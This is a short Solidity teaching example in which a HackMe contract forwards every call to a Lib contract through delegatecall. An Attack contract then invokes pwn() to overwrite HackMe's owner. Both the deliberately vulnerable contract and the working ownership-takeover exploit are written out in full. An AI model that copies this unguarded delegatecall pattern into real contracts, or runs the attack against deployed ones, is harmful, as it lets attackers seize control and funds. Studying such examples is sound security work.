// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

contract HackMe 
{
    address public owner;
    Lib public lib;

    constructor (Lib _lib) public
    {
        owner = msg.sender;
        lib = Lib(_lib);
    }

    fallback() external payable
    {
        address(lib).delegatecall(msg.data);
    }

}

contract Lib 
{
    address public owner;

    function pwn() public 
    {
        owner = msg.sender;
    }
}

contract Attack
{
    address public hackme;

    constructor (address _hackme) public
    {
        hackme = _hackme;
    }

    function attack () public
    {
        hackme.call(abi.encodeWithSignature("pwn()"));
    }
}
